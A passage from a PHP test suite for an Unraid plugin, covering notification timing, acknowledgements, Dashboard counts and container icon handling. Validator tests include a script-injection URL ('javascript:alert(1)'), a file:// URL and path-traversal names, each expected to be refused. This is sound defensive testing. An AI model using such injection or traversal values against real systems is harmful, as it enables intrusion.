    $calls = function () use ($log): array {
        $out = [];
        foreach (array_filter(explode("\n", (string) @file_get_contents($log))) as $line) {
            $args = explode("\x1f", rtrim($line, "\x1f"));
            $o = [];
            for ($i = 0; $i + 1 < count($args); $i += 2) {
                $o[$args[$i]] = $args[$i + 1];
            }
            $out[] = $o;
        }
        return $out;
    };

    // which findings are red: required and known to be missing, one key per thing
    $f = fn (string $id, string $level, ?bool $ok, array $p = []) => finding($id, $level, $ok, $p);
    $red = caretakerRed(['backup' => [$f('setup', 'required', true), $f('schedule', 'required', false), $f('kopia_repo', 'required', null),
                                      $f('drift', 'recommended', false), $f('kopia_running', 'required', false, ['name' => 'kopia'])],
                         'emby'   => [$f('python', 'required', false)]]);
    same('notify: red findings', ['backup:schedule:', 'backup:kopia_running:kopia', 'emby:python:'], array_keys($red));

    // the steps by themselves
    $t0 = 1_800_000_000;
    $one = ['backup:schedule:' => ['desk' => 'backup', 'id' => 'schedule', 'params' => []]];
    [$tr, $tell] = caretakerNotifyStep([], $one, $t0, true, 1800);
    same('notify step: new — waits', [0, $t0, null], [count($tell), $tr['backup:schedule:']['since'], $tr['backup:schedule:']['told']]);
    [$tr, $tell] = caretakerNotifyStep($tr, $one, $t0 + 1799, true, 1800);
    same('notify step: not yet half an hour', 0, count($tell));
    [$tr, $tell] = caretakerNotifyStep($tr, $one, $t0 + 1800, true, 1800);
    same('notify step: stayed — told', ['schedule'], array_column($tell, 'id'));
    [$tr, $tell] = caretakerNotifyStep($tr, $one, $t0 + 9000, true, 1800);
    same('notify step: same — quiet', 0, count($tell));
    [$tr, $tell] = caretakerNotifyStep($tr, [], $t0 + 9100, true, 1800);
    same('notify step: solved — forgotten', [], $tr);
    [$tr, $tell] = caretakerNotifyStep($tr, $one, $t0 + 9200, true, 1800);
    [$tr, $tell] = caretakerNotifyStep($tr, $one, $t0 + 11000, true, 1800);
    same('notify step: back — told again', ['schedule'], array_column($tell, 'id'));
    [$tr, $tell] = caretakerNotifyStep([], $one, $t0, false, 1800);
    [$tr, $tell] = caretakerNotifyStep($tr, $one, $t0 + 1800, false, 1800);
    same('notify step: switched off — nothing told', 0, count($tell));
    [$tr, $tell] = caretakerNotifyStep($tr, $one, $t0 + 3600, true, 1800);
    same('notify step: switched on again — no backlog', 0, count($tell));

    // the whole way, with the state file and the stand-in notify
    $file = "$tmp/caretaker/notify.json";
    $checks = ['backup' => [$f('schedule', 'required', false)], 'emby' => [$f('python', 'required', true)]];
    caretakerNotifyEvaluate($checks, $file, $t0, 'de');
    same('notify: a new red finding waits', 0, count($calls()));
    check('notify: state written', is_file($file));
    caretakerNotifyEvaluate($checks, $file, $t0 + 1800, 'de');
    $c = $calls();
    same('notify: told after half an hour', 1, count($c));
    same('notify: subject in Unraid\'s language', 'Unraid Secretary Office: Etwas Neues zu erledigen', $c[0]['-s'] ?? null);
    same('notify: event as the engine\'s', 'Unraid Secretary Office', $c[0]['-e'] ?? null);
    same('notify: a warning', 'warning', $c[0]['-i'] ?? null);
    check('notify: what is missing in the bell', str_contains($c[0]['-d'] ?? '', 'Herr Backupsi — Ein nächtliches Backup ist geplant'), $c[0]['-d'] ?? '');
    check('notify: long text with what to do, lines as Unraid\'s \n', str_contains($c[0]['-m'] ?? '', 'Herr Backupsi → Zeitplan')
        && str_contains($c[0]['-m'] ?? '', '\n') && !str_contains($c[0]['-m'] ?? '', "\n"), $c[0]['-m'] ?? '');
    $page = caretakerNotifyPublic(readJson($file) ?? []);
    same('notify: the last report for the page', [true, ['schedule']], [$page['on'], array_column($page['last']['items'] ?? [], 'id')]);
    caretakerNotifyEvaluate($checks, $file, $t0 + 5400, 'de');
    same('notify: same finding — quiet', 1, count($calls()));
    caretakerNotifyEvaluate(['backup' => [$f('schedule', 'required', true)]], $file, $t0 + 6000, 'de');
    same('notify: solved — no all clear', 1, count($calls()));
    $two = ['backup' => [$f('schedule', 'required', false)], 'emby' => [$f('python', 'required', false)]];
    caretakerNotifyEvaluate($two, $file, $t0 + 6100, 'en');
    caretakerNotifyEvaluate($two, $file, $t0 + 7900, 'en');
    $c = $calls();
    same('notify: back and a second one — one notification', 2, count($c));
    same('notify: both in it (English)', 'Unraid Secretary Office: 2 new things to do', $c[1]['-s'] ?? null);
    check('notify: both listed', str_contains($c[1]['-d'] ?? '', 'Mr. Backupsy — A nightly backup is scheduled')
        && str_contains($c[1]['-d'] ?? '', 'Jack Emby — Python 3'), $c[1]['-d'] ?? '');
    $data = readJson($file) ?? [];
    $data['on'] = false;
    file_put_contents($file, json_encode($data));
    $other = ['backup' => [$f('dumps_share', 'required', false, ['share' => ''])]];
    caretakerNotifyEvaluate($other, $file, $t0 + 8000, 'en');
    caretakerNotifyEvaluate($other, $file, $t0 + 9800, 'en');
    same('notify: switched off — quiet', 2, count($calls()));
    same('notify: switched off — the page knows', false, caretakerNotifyPublic(readJson($file) ?? [])['on']);

    // Unraid's language, when the office speaks it
    foreach (['de_DE' => 'de', 'fr_FR' => 'fr', 'pt_BR' => 'en', '' => 'en', '../x' => 'en'] as $locale => $want) {
        file_put_contents("$tmp/dynamix.cfg", "[display]\nlocale=\"$locale\"\n[notify]\nalert=\"1\"\n");
        same("notify language for locale '$locale'", $want, officeNotifyLang("$tmp/dynamix.cfg"));
    }
    same('notify text: plural and placeholder', '3 neue Dinge zu erledigen', officeNotifyText('caretaker', 'notify.subject', ['n' => 3], 'de'));
    same('notify text: unknown key', '', officeNotifyText('caretaker', 'notify.nothing', [], 'de'));
    putenv("OFFICE_NOTIFY_BIN=$tmp/none");
    check('notify: no notify script — nothing, no error', !officeNotify('x', 'y'));

    // Jack Emby: only real runs that went wrong
    foreach ([['run', 'failed', [], 'failed'], ['run', 'aborted', [], 'aborted'], ['run', 'config', [], 'config'],
              ['run', 'errors', [], 'errors'], ['run', 'ok', ['errors' => 2], 'errors'], ['run', 'ok', ['errors' => 0], null],
              ['run', 'busy', [], null], ['run', 'refused', [], null], ['dry', 'failed', [], null], ['report', 'failed', [], null]] as [$mode, $result, $status, $want]) {
        same("emby notify: $mode $result " . json_encode($status), $want, embyNotifyOutcome($mode, $result, $status));
    }

    // every notification text the code asks for by name exists in English
    foreach (array_merge(glob(OFFICE_DIR . '/agent/desks/*.php') ?: [], glob(OFFICE_DIR . '/agent/lib/*.php') ?: []) as $php) {
        preg_match_all("/officeNotifyText\\(\\s*'([a-z]+)',\\s*'([a-z0-9_.]+)'/", (string) file_get_contents($php), $m, PREG_SET_ORDER);
        foreach ($m as [, $desk, $key]) {
            check(basename($php) . " asks for notification text $desk.$key", officeNotifyText($desk, $key, ['n' => 2], 'en') !== '');
        }
    }

    putenv($before === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$before");
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * The team lead's «I know, thanks»: what a finding's signature depends on,
 * which findings get marked (never a must), how the notes are kept tidy, the
 * file on a copy — and the Dashboard tile counting only what is open, and
 * saying what the engine is doing while it runs.
 */
function testCaretakerAcks(): void
{
    $f = fn (string $id, string $level, ?bool $ok, array $p = []) => finding($id, $level, $ok, $p);

    // the signature: what it is about — not the order of its params, not an age or a size growing
    $upd = fn (string $latest, string $level = 'recommended') => $f('office_update', $level, false, ['version' => '1.26', 'latest' => $latest]);
    $sig = caretakerAckSig('caretaker', $upd('1.27'));
    check('ack sig: shaped for the action', (bool) preg_match(CARETAKER_ACK_SIG, $sig), $sig);
    same('ack sig: params in another order', $sig, caretakerAckSig('caretaker', $f('office_update', 'recommended', false, ['latest' => '1.27', 'version' => '1.26'])));
    check('ack sig: another version — comes back', $sig !== caretakerAckSig('caretaker', $upd('1.28')));
    check('ack sig: another level — comes back', $sig !== caretakerAckSig('caretaker', $upd('1.27', 'required')));
    check('ack sig: another desk', $sig !== caretakerAckSig('backup', $upd('1.27')));
    $cont = fn (string $name) => caretakerAckSig('caretaker', $f('other_backup_container', 'hint', null, ['name' => $name, 'image' => 'duplicati']));
    check('ack sig: another container — comes back', $cont('a') !== $cont('b'));
    $old = fn (int $n, int $days, string $size) => caretakerAckSig('cleanup', $f('trash_old', 'recommended', false, ['n' => $n, 'days' => $days, 'size' => $size]));
    same('ack sig: the storeroom only getting older and bigger — the same', $old(2, 31, '2 GB'), $old(2, 32, '2.1 GB'));
    check('ack sig: one more old run — comes back', $old(2, 31, '2 GB') !== $old(3, 31, '2 GB'));

    // the marks: a noted recommendation or note counts no more; a must or something in place is never marked
    $t0 = 1_800_000_000;
    $checks = ['emby'      => [$f('schedule', 'recommended', false), $f('python', 'required', false)],
               'caretaker' => [$f('other_backup_container', 'hint', null, ['name' => 'duplicati', 'image' => 'x']), $f('community_apps', 'recommended', true)]];
    $s = fn (string $desk, int $i) => caretakerAckSig($desk, $checks[$desk][$i]);
    $note = fn (string $desk, string $id) => ['desk' => $desk, 'id' => $id, 'time' => $t0, 'seen' => $t0];
    $acks = [$s('emby', 0) => $note('emby', 'schedule'), $s('caretaker', 0) => $note('caretaker', 'other_backup_container'),
             $s('emby', 1) => $note('emby', 'python'), $s('caretaker', 1) => $note('caretaker', 'community_apps')];   // the last two can't be noted
    [$marked, $kept] = caretakerAckStep($checks, $acks, $t0 + 60);
    same('ack mark: every finding has its sig', [true, true, true, true],
        array_map(fn ($x) => preg_match(CARETAKER_ACK_SIG, (string) ($x['sig'] ?? '')) === 1, [...$marked['emby'], ...$marked['caretaker']]));
    same('ack mark: the noted recommendation and note', [true, true], [$marked['emby'][0]['acked'] ?? false, $marked['caretaker'][0]['acked'] ?? false]);
    same('ack mark: never a must', false, $marked['emby'][1]['acked'] ?? false);
    same('ack mark: nothing in place', false, $marked['caretaker'][1]['acked'] ?? false);
    same("ack mark: the reports to Unraid don't change", caretakerRed($checks), caretakerRed($marked));

    // tidy: still there → seen once a day; in place → forgotten (back again, shown again); not seen for a month → forgotten
    same('ack tidy: seen not rewritten within a day', $t0, $kept[$s('emby', 0)]['seen']);
    [, $kept] = caretakerAckStep($checks, $acks, $t0 + 86400);
    same('ack tidy: seen once a day', $t0 + 86400, $kept[$s('emby', 0)]['seen']);
    check('ack tidy: something in place — its note forgotten', !isset($kept[$s('caretaker', 1)]));
    $solved = $checks;
    $solved['emby'][0]['ok'] = true;
    [, $kept] = caretakerAckStep($solved, $acks, $t0 + 60);
    check('ack tidy: sorted out — forgotten', !isset($kept[$s('emby', 0)]));
    [$back] = caretakerAckStep($checks, $kept, $t0 + 120);
    same('ack tidy: turns up again — shown again', false, $back['emby'][0]['acked'] ?? false);
    $gone = ['emby' => [], 'caretaker' => []];
    [, $kept] = caretakerAckStep($gone, $acks, $t0 + 29 * 86400);
    check('ack tidy: not seen for a while (desk let go) — kept', isset($kept[$s('emby', 0)]));
    [, $kept] = caretakerAckStep($gone, $acks, $t0 + 31 * 86400);
    same('ack tidy: not seen for a month — forgotten', [], $kept);

    // the file, on a copy
    $tmp = sys_get_temp_dir() . '/office-tests-acks-' . getmypid();
    $file = "$tmp/caretaker/acks.json";
    caretakerAckApply($checks, $file, $t0);
    check('ack file: nothing noted — no file written', !is_file($file));
    caretakerWrite($file, ['acks' => [$s('emby', 0) => $note('emby', 'schedule'), '../x' => $note('emby', 'x'), $s('caretaker', 0) => 'odd']]);
    same('ack file: odd entries left out', [$s('emby', 0)], array_keys(caretakerAckRead($file)));
    $marked = caretakerAckApply($checks, $file, $t0 + 60);
    same('ack file: marked from the file', true, $marked['emby'][0]['acked'] ?? false);
    caretakerAckApply($solved, $file, $t0 + 120);
    same('ack file: sorted out — gone from the file', [], caretakerAckRead($file));
    exec('rm -rf ' . escapeshellarg($tmp));

    // the Dashboard tile (src/dashboard.php): only open points of desks that work here
    require_once OFFICE_DIR . '/src/dashboard.php';
    [$marked] = caretakerAckStep($checks, $acks, $t0);
    $all = ['emby' => 1, 'caretaker' => 1];
    same('dashboard: without notes — to do and recommended', [1, 1], officeDashCareCounts(['checks' => $checks], $all));
    same('dashboard: the noted recommendation counts no more', [1, 0], officeDashCareCounts(['checks' => $marked], $all));
    $forged = $checks;
    $forged['emby'][1]['acked'] = true;
    same('dashboard: a must always counts', [1, 1], officeDashCareCounts(['checks' => $forged], $all));
    same("dashboard: desks that don't work here don't count", [0, 0], officeDashCareCounts(['checks' => $checks], ['caretaker' => 1]));
    same('dashboard: no state', [0, 0], officeDashCareCounts([], $all));
    foreach ([[['result' => 'running', 'mode' => 'backup'], 'dash.bk_running'], [['result' => 'running', 'mode' => 'check'], 'dash.bk_checking'],
              [['result' => 'running', 'mode' => 'dryrun'], 'dash.bk_dryrun'], [['result' => 'ok', 'mode' => 'check'], 'dash.bk_running'],
              [null, 'dash.bk_running']] as [$status, $want]) {
        same('dashboard: the engine runs, status ' . json_encode($status), $want, officeDashBackupRunning(['running' => true, 'status' => $status]));
    }
}

/** Ms. Dustdevil's pictures: how Unraid matches templates, the logo lookup, and editing templates and override files on copies */
function testIcons(): void
{
    // DockerUtil::ensureImageTag(): a template's <Repository> and a container's image compare like this
    same('icon: image tag, official image', 'library/php:apache', clImageTag('php:apache'));
    same('icon: image tag, latest added', 'ghcr.io/imagegenius/kopia:latest', clImageTag('ghcr.io/imagegenius/kopia'));
    same('icon: image tag, registry port', 'registry:5000/team/app:latest', clImageTag('registry:5000/team/app'));
    same('icon: image tag, same image', clImageTag('library/redis:latest'), clImageTag('redis'));

    foreach ([['ghcr.io/immich-app/postgres:14-vectorchord0.4.3@sha256:bcf6', ['ghcr.io/immich-app/postgres', 'immich-app/postgres']],
              ['docker.io/valkey/valkey:9@sha256:c123', ['valkey/valkey', 'valkey/valkey']],
              ['mariadb:11.4', ['mariadb', 'mariadb']],
              ['lscr.io/linuxserver/mariadb', ['lscr.io/linuxserver/mariadb', 'linuxserver/mariadb']],
              ['registry:5000/Team/App:1', ['registry:5000/team/app', 'team/app']],
              ['library/nginx:alpine', ['nginx', 'nginx']]] as [$image, $want]) {
        same("icon: lookup names of $image", $want, clIconRepo($image));
    }
    foreach (['immich-app/immich-server' => 'immich', 'immich-app/immich-machine-learning' => 'immich', 'immich-app/postgres' => 'postgres',
              'tensorchord/pgvecto-rs' => 'postgres', 'tensorchord/vchord-postgres' => 'postgres', 'valkey/valkey' => 'valkey', 'redis' => 'redis',
              'mariadb' => 'mariadb', 'linuxserver/mariadb' => 'mariadb', 'mysql' => 'mysql', 'mongo' => 'mongodb', 'nextcloud' => 'nextcloud',
              'nextcloud-ocr' => 'nextcloud', 'nextcloud/all-in-one' => 'nextcloud', 'jellyfin/jellyfin' => 'jellyfin', 'plexinc/pms-docker' => 'plex',
              'linuxserver/plex' => 'plex', 'emby/embyserver' => 'emby', 'binhex/arch-emby' => 'emby', 'php' => 'php', 'httpd' => 'apache',
              'jc21/nginx-proxy-manager' => 'nginx-proxy-manager', 'homeassistant/home-assistant' => 'home-assistant',
              'vaultwarden/server' => 'vaultwarden', 'kopia/kopia' => null, 'uping/embystat' => null, 'linuxserver/jellyseerr' => null] as $loose => $want) {
        same("icon: table for $loose", $want, clIconTableSlug($loose));
    }
    foreach (CL_ICON_TABLE as $re => $slug) {
        check("icon: table entry $slug is a name of the collection", preg_match('/^[a-z0-9]+(-[a-z0-9]+)*$/', $slug) === 1 && @preg_match($re, '') !== false);
    }
    same('icon: guesses for immich ML', ['immich-machine-learning', 'immich'], clIconGuesses('immich-app/immich-machine-learning'));
    same('icon: guesses for sonarr', ['sonarr'], clIconGuesses('linuxserver/sonarr'));
    same('icon: guesses leave generic words out', ['arch-emby', 'emby'], clIconGuesses('binhex/arch-emby'));
    same('icon: guesses strip -server and docker-', ['docker-foo-server', 'foo'], clIconGuesses('x/docker-foo_server'));

    // Community Applications' feed: an Icon belongs to the Repository before it, unless another entry began
    $feed = implode("\n", ['s:4:"Name";', 's:10:"Repository";s:13:"valkey/valkey"', 's:4:"Icon";s:18:"https://x/vk-1.png"',
        's:4:"Name";', 's:4:"Name";', 's:10:"Repository";s:21:"lscr.io/linuxserver/a"', 's:4:"Name";',
        's:4:"Name";', 's:4:"Icon";s:19:"https://x/plug.png"',
        's:4:"Name";', 's:10:"Repository";s:20:"valkey/valkey:8-trix"', 's:4:"Icon";s:18:"https://x/vk-2.png"',
        's:4:"Name";', 's:10:"Repository";s:5:"redis"', 's:4:"Icon";s:17:"https://x/r.svg"',
        '"Name": "b"', '"Repository": "ghcr.io/versity/versitygw"', '"Icon": "https:\/\/x\/vgw.png"', '"Name": "App Data"']);
    $ca = clCaParse($feed);
    same('ca: pictures by image', ['https://x/vk-1.png' => 1, 'https://x/vk-2.png' => 1], $ca['exact']['valkey/valkey'] ?? null);
    check('ca: a plugin\'s picture never goes to the app before it', !isset($ca['exact']['lscr.io/linuxserver/a']));
    check('ca: svg left out', !isset($ca['exact']['redis']));
    same('ca: JSON feed, loose name', ['https://x/vgw.png' => 1], $ca['loose']['versity/versitygw'] ?? null);

    check('icon url ok', clIconUrlOk('https://example.com/a/b-1.png?x=1&y=2'));
    foreach (['file:///boot/x.png', 'ftp://x/y.png', 'https://x/a b.png', 'https://x/"a.png', "https://x/a\n.png", 'javascript:alert(1)', 'https://x/a<b>.png'] as $bad) {
        check('icon url refused: ' . json_encode($bad), !clIconUrlOk($bad));
    }
    same('icon: override name', 'compose.override.yaml', clOverrideName('/x/compose.yaml'));
    same('icon: override name, old style', 'docker-compose.override.yml', clOverrideName('/x/docker-compose.yml'));
    same('icon: home of a template', CL_TEMPLATES, clIconHome(CL_TEMPLATES . '/my-a.xml', '/r'));
    same('icon: home of an override file', '/r/p', clIconHome('/r/p/compose.override.yaml', '/r'));
    same('icon: no home elsewhere', '', clIconHome('/r/p/q/compose.override.yaml', '/r') . clIconHome('/tmp/my-a.xml', '/r') . clIconHome('/r/p/compose.yaml', '/r'));

    // a template: only its <Icon> changes
    $tpl = "<?xml version=\"1.0\"?>\n<Container version=\"2\">\n  <Name>web</Name>\n  <Repository>php:apache</Repository>\n  <Registry/>\n  <Icon/>\n  <Config Name=\"x\" Type=\"Path\">/mnt/user/appdata/web</Config>\n</Container>\n";
    same('template: empty <Icon/> set', str_replace('<Icon/>', '<Icon>https://x/a.png?b=1&amp;c=2</Icon>', $tpl), clXmlSetIcon($tpl, 'https://x/a.png?b=1&c=2', 't'));
    $old = str_replace('<Icon/>', '<Icon>/boot/config/plugins/dockerMan/images/Apache.png</Icon>', $tpl);
    same('template: old <Icon> replaced', str_replace('<Icon/>', '<Icon>file:///boot/x.png</Icon>', $tpl), clXmlSetIcon($old, 'file:///boot/x.png', 't'));
    $none = str_replace("  <Icon/>\n", '', $tpl);
    same('template: <Icon> added after <Repository>', str_replace("</Repository>\n", "</Repository>\n  <Icon>https://x/a.png</Icon>\n", $none), clXmlSetIcon($none, 'https://x/a.png', 't'));
    foreach (['two icons' => str_replace('<Icon/>', "<Icon/>\n  <Icon>y</Icon>", $tpl), 'CDATA' => str_replace('<Icon/>', '<Icon><![CDATA[x]]></Icon>', $tpl),
              'no template' => "<foo/>\n"] as $what => $bad) {
        try {
            clXmlSetIcon($bad, 'https://x/a.png', 't');
            check("template refused: $what", false);
        } catch (Problem $p) {
            same("template refused: $what", 'cleanup_icon_shape', $p->key);
        }
    }

    // an override file, the shapes Compose Manager writes
    $set = ['database' => 'https://x/pg.png'];
    $cm = clOverrideTemplate();
    same('override: Compose Manager\'s new file', str_replace("services: {}\n", "services:\n  database:\n    labels:\n      net.unraid.docker.managed: 'composeman'\n      net.unraid.docker.icon: 'https://x/pg.png'\n", $cm),
        clOverrideSetIcons($cm, $set, 'o'));
    $immich = "services:\n  immich-server:\n    labels:\n      net.unraid.docker.managed: 'composeman'\n      net.unraid.docker.icon: ''\n      net.unraid.docker.webui: ''\n      net.unraid.docker.shell: ''\n"
            . "  database:\n    labels:\n      net.unraid.docker.managed: 'composeman'\n      net.unraid.docker.icon: ''   # empty\n      net.unraid.docker.webui: ''\n";
    $want = str_replace("      net.unraid.docker.icon: ''   # empty\n", "      net.unraid.docker.icon: 'https://x/pg.png'\n", $immich);
    $want = str_replace("      net.unraid.docker.icon: ''\n      net.unraid.docker.webui: ''\n      net.unraid.docker.shell", "      net.unraid.docker.icon: 'https://x/im''s.png'\n      net.unraid.docker.webui: ''\n      net.unraid.docker.shell", $want);
    same('override: only the icon lines change', $want, clOverrideSetIcons($immich, $set + ['immich-server' => "https://x/im's.png"], 'o'));
    $more = "version: '3'\nservices:\n  app:\n    environment:\n      - A=1\n    labels:\n      net.unraid.docker.managed: 'composeman'\n      com.example.x: \"y\"\n  cron:\n    environment:\n      B: 2\n\n# end\nnetworks:\n  default: {}\n";
    same('override: added to labels, a new labels block, a new service', "version: '3'\nservices:\n  app:\n    environment:\n      - A=1\n    labels:\n      net.unraid.docker.managed: 'composeman'\n      net.unraid.docker.icon: 'https://x/a.png'\n      com.example.x: \"y\"\n"
        . "  cron:\n    environment:\n      B: 2\n    labels:\n      net.unraid.docker.icon: 'https://x/c.png'\n  redis:\n    labels:\n      net.unraid.docker.managed: 'composeman'\n      net.unraid.docker.icon: 'https://x/r.png'\n\n# end\nnetworks:\n  default: {}\n",
        clOverrideSetIcons($more, ['app' => 'https://x/a.png', 'cron' => 'https://x/c.png', 'redis' => 'https://x/r.png'], 'o'));
    same('override: labels: {} and CRLF', "services:\r\n  app:\r\n    labels:\r\n      net.unraid.docker.icon: 'https://x/a.png'\r\n",
        clOverrideSetIcons("services:\r\n  app:\r\n    labels: {}\r\n", ['app' => 'https://x/a.png'], 'o'));
    same('override: empty file', "services:\n  '1':\n    labels:\n      net.unraid.docker.managed: 'composeman'\n      net.unraid.docker.icon: 'https://x/a.png'\n",
        clOverrideSetIcons('', ['1' => 'https://x/a.png'], 'o'));
    foreach (['tab' => "services:\n\tapp:\n", 'four spaces' => "services:\n    app:\n      labels:\n", 'labels as a list' => "services:\n  app:\n    labels:\n      - \"a=b\"\n",
              'merge key' => "services:\n  app:\n    <<: *base\n", 'anchor' => "services:\n  app:\n    labels:\n      net.unraid.docker.icon: &i x\n",
              'flow services' => "services: {app: {}}\n", 'deeper label' => "services:\n  app:\n    labels:\n      a:\n        b: c\n",
              'block scalar' => "services:\n  app:\n    labels:\n      a: |\n        x\n", 'twice' => "services:\n  app: \nservices:\n"] as $what => $bad) {
        try {
            clOverrideSetIcons($bad, ['app' => 'https://x/a.png'], 'o');
            check("override refused: $what", false);
        } catch (Problem $p) {
            same("override refused: $what", 'cleanup_icon_shape', $p->key);
        }
    }

    // on copies: swap a template into a storeroom and back; a new override file and back; Unraid's cache
    $tmp = sys_get_temp_dir() . '/office-tests-icons-' . getmypid();
    @mkdir("$tmp/templates", 0700, true);
    @mkdir("$tmp/project", 0700, true);
    @mkdir("$tmp/ram", 0700, true);
    @mkdir("$tmp/disk", 0700, true);
    file_put_contents("$tmp/templates/my-web.xml", $old);
    $new = clXmlSetIcon($old, 'https://x/a.png', 't');
    clIconReplace("$tmp/templates/my-web.xml", $new, "$tmp/trash/run/icons/abc/my-web.xml");
    same('swap: the new template in place', $new, file_get_contents("$tmp/templates/my-web.xml"));
    same('swap: the old one in the storeroom', $old, file_get_contents("$tmp/trash/run/icons/abc/my-web.xml"));
    same('swap: no temp file left', [], glob("$tmp/templates/.*.tmp") ?: []);
    $m = ['from' => "$tmp/templates/my-web.xml", 'written' => md5($new), 'was' => 'there'];
    file_put_contents("$tmp/templates/my-web.xml", $new . ' ');
    try {
        clIconPutBack("$tmp/trash/run/icons/abc/my-web.xml", $m);
        check('put back refused once the template changed', false);
    } catch (Problem $p) {
        same('put back refused once the template changed', 'cleanup_icon_changed', $p->key);
    }
    file_put_contents("$tmp/templates/my-web.xml", $new);
    clIconPutBack("$tmp/trash/run/icons/abc/my-web.xml", $m);
    same('put back: the old template again', $old, file_get_contents("$tmp/templates/my-web.xml"));
    check('put back: out of the storeroom', !file_exists("$tmp/trash/run/icons/abc/my-web.xml"));

    $override = "$tmp/project/compose.override.yaml";
    $text = clOverrideSetIcons(clOverrideTemplate(), $set, 'o');
    clIconReplace($override, $text, "$tmp/trash/run/icons/def/compose.override.yaml", clOverrideTemplate());
    same('new override: written', $text, file_get_contents($override));
    same('new override: Compose Manager\'s empty one in the storeroom', clOverrideTemplate(), file_get_contents("$tmp/trash/run/icons/def/compose.override.yaml"));
    file_put_contents("$tmp/png", "\x89PNG\r\n\x1a\n" . str_repeat('x', 100));
    file_put_contents("$tmp/docker.json", json_encode(['other' => ['icon' => '/x.png', 'url' => 'u'], 'web' => ['icon' => CL_DM_FALLBACK_WEB, 'updated' => 'false']]));
    $cache = clIconSeed('web', "$tmp/png", ["$tmp/ram", "$tmp/disk"], "$tmp/docker.json", '/state/x');
    same('seed: both copies', ["$tmp/ram/web-icon.png", "$tmp/disk/web-icon.png"], array_keys($cache));
    $dj = json_decode((string) file_get_contents("$tmp/docker.json"), true);
    same('seed: docker.json points at it, the rest stays', ['other' => ['icon' => '/x.png', 'url' => 'u'], 'web' => ['icon' => '/state/x/web-icon.png', 'updated' => 'false']], $dj);
    same('seed: a strange name is refused', [], clIconSeed('../x', "$tmp/png", ["$tmp/ram"], "$tmp/docker.json"));
    file_put_contents("$tmp/project/icon_url", 'https://x/a.png');
    clIconPutBack("$tmp/trash/run/icons/def/compose.override.yaml", ['from' => $override, 'written' => md5($text), 'was' => 'missing', 'cache' => $cache,
        'icon_url' => ['path' => "$tmp/project/icon_url", 'md5' => md5('https://x/a.png'), 'was' => 'missing']], ["$tmp/ram", "$tmp/disk"]);
    check('put back: the new override file is gone again', !file_exists($override) && !file_exists("$tmp/trash/run/icons/def/compose.override.yaml"));
    check('put back: icon_url and the cache copies gone', !file_exists("$tmp/project/icon_url") && !file_exists("$tmp/ram/web-icon.png") && !file_exists("$tmp/disk/web-icon.png"));

    // what curl answered: a picture only with 200 and a PNG
    file_put_contents("$tmp/0.png", "\x89PNG\r\n\x1a\nxx");
    file_put_contents("$tmp/1.png", '<html>');
    $r = clIconFetchResults("1\t200\t6\ttext/html\n0\t200\t10\timage/png\n2\t404\t9\ttext/plain\n", ['https://a/0.png', 'https://a/1.png', 'https://a/2.png', 'https://a/3.png'], $tmp);
    ksort($r);
    same('fetch: what loads', ['https://a/0.png' => true, 'https://a/1.png' => false, 'https://a/2.png' => false, 'https://a/3.png' => false], array_map(fn ($x) => $x['ok'], $r));
    same('fetch: why not', [null, 'not_png', 'http_404', 'unreachable'], array_values(array_map(fn ($x) => $x['why'], [$r['https://a/0.png'], $r['https://a/1.png'], $r['https://a/2.png'], $r['https://a/3.png']])));
    $cmd = clIconFetchCommand(['https://a/0.png'], '/d');
    check('fetch: no shell globbing, http(s) only, no User-Agent', in_array('-g', $cmd, true) && in_array('=http,https', $cmd, true) && $cmd[array_search('-A', $cmd, true) + 1] === '');
    same('loop risk: its fields', ['version', 'affected', 'fallback_missing', 'containers', 'risk', 'standin'], array_keys(cleanupIconLoopRisk([])));

    // pictures in dockerMan/images named like the app — never by the first word of the container's name alone
    $files = ['Apache.png', 'AppleTimeMachine.png', 'emby.png', 'Nextcloud.png', 'cloud.png', 'redis.png', 'app.png'];
    foreach ([['mbentley/timemachine', 'TimeMachine_Benj', ['AppleTimeMachine.png']], ['emby/embyserver', 'EmbyServer', ['emby.png']],
              ['nextcloud-ocr', 'nextcloud-app', ['Nextcloud.png']], ['mariadb', 'nextcloud-db', []], ['redis', 'nextcloud-redis', ['redis.png']],
              ['php', 'CKW-Webseite', []], ['x/y', 'apache', ['Apache.png']]] as [$loose, $name, $want]) {
        same("icon folder: $name ($loose)", $want, clIconFolderMatches($loose, $name, $files));
    }
    check('icon: Time Machine by name or image', preg_match(CL_ICON_TIMEMACHINE, 'TimeMachine_Benj x/y') && preg_match(CL_ICON_TIMEMACHINE, 'b willtho89/samba-time_machine')
        && !preg_match(CL_ICON_TIMEMACHINE, 'machine timer'));
    same('icon: a safe file name', ['TimeMachine_Benj', 'a_b_c', 'container'], [clIconFileName('TimeMachine_Benj'), clIconFileName('../a b/c'), clIconFileName('..')]);

    // the stack's picture: its main app, never a database, machine learning only without a better one
    $immich = [['id' => 'icon:ml', 'name' => 'immich_machine_learning', 'service' => 'immich-machine-learning', 'image' => 'ghcr.io/immich-app/immich-machine-learning:v3', 'project' => 'immich'],
               ['id' => 'icon:pg', 'name' => 'immich_postgres', 'service' => 'database', 'image' => 'ghcr.io/immich-app/postgres:14', 'project' => 'immich'],
               ['id' => 'icon:sv', 'name' => 'immich_server', 'service' => 'immich-server', 'image' => 'ghcr.io/immich-app/immich-server:v3', 'project' => 'immich'],
               ['id' => 'icon:rd', 'name' => 'immich_redis', 'service' => 'redis', 'image' => 'valkey/valkey:9', 'project' => 'immich']];
    same('stack: ranks', [4, null, 1, null], array_map('clIconMainRank', $immich));
    $picked = fn (array $list) => clIconStackPick(array_map(fn ($e) => $e + ['pick' => 'https://x/' . $e['name'] . '.png'], $list), $immich)['name'] ?? null;
    same('stack: the server, not machine learning', 'immich_server', $picked($immich));
    same('stack: machine learning alone waits for the server', null, $picked([$immich[0]]));
    same('stack: a database alone never', null, $picked([$immich[1]]));
    same('stack: named like the project first', 'nextcloud', clIconStackPick([['id' => 'a', 'name' => 'nc-web', 'service' => 'web', 'image' => 'nginx', 'project' => 'nextcloud', 'pick' => 'https://x/w.png'],
        ['id' => 'b', 'name' => 'nextcloud', 'service' => 'nextcloud', 'image' => 'nextcloud', 'project' => 'nextcloud', 'pick' => 'https://x/n.png']], [])['name'] ?? null);
    same('stack: no picture from a file on the server', null, clIconStackPick([$immich[2] + ['pick' => 'file:///boot/x.png']], $immich));

    // an uploaded picture: a PNG, small, at most 512 x 512
